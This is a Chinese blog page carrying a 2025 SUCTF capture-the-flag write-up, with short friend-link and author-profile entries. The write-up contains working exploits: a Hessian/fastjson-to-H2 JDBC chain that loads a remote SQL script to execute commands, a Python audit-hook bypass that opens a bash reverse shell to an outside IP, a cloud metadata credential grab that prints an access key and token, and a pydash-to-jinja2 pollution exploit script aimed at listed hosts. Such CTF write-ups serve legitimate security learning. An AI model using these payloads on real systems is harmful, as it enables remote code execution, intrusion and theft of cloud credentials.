\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" Z3n1th z3✌️ N1rvana SU Weber Kengwang Stay Cool~ J1rry SYCのWeber adwa 0XFFF-Cryptor ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"友链"},{"categories":null,"contents":"一名大二在读学生\nSyclover主力成员\n对各种安全感兴趣，目前主要学习的还的是Web安全（Java 安全、偶然也会学点云安全,等）\n最爱吃，最喜欢吃的是🍉，最喜欢干的事情就是大夏天抱着半个西瓜拿勺子挖着吃然后看视频\n什么都想学，但什么都不会\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"}]